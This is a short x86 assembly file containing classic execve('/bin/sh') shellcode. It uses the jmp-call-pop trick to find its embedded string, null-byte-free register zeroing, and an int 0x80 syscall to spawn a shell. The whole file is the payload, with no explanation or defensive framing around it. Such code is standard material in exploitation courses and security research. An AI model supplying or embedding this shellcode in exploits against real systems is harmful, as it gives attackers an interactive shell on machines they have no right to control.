BITS 32

section .data
global _start

_start:
  jmp ed

st:
  pop ebx
  xor eax, eax
  mov [ebx+7], al
  xor ecx, ecx
  xor edx, edx
  mov al, 11
  int 0x80

ed:
  call st
  db '/bin/sh'
